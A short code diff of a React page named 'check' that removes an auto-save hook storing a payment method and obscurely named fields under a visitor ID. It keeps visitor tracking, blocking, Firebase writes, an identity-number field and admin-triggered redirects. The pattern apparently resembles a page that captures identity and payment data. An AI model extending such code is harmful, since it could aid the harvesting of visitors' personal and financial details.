@@ -17,7 +17,6 @@ import { FullPageLoader } from "@/components/loader";
 import { StepShell } from "@/components/step-shell";
 import P1 from "@/components/form-a";
 import { getOrCreateVisitorID, checkIfBlocked } from "@/lib/visitor-tracking";
-import { useAutoSave } from "@/hooks/use-auto-save";
 import { useRedirectMonitor } from "@/hooks/use-redirect-monitor";
 import { addData, db } from "@/lib/firebase";
 import { doc, getDoc, onSnapshot, Firestore } from "firebase/firestore";
@@ -44,18 +43,6 @@ export default function CheckPage() {
   // Language
   const [language, setLanguage] = useState<"ar" | "en">("ar");
   const [identityNumber, setIdentityNumber] = useState("");
-
-  // Auto-save
-  useAutoSave({
-    visitorId: visitorID,
-    pageName: "check",
-    data: {
-      selectedPaymentMethod,
-      _v1,
-      _v2,
-      _v3,
-    },
-  });
 
   // Monitor redirect requests from admin
   useRedirectMonitor({
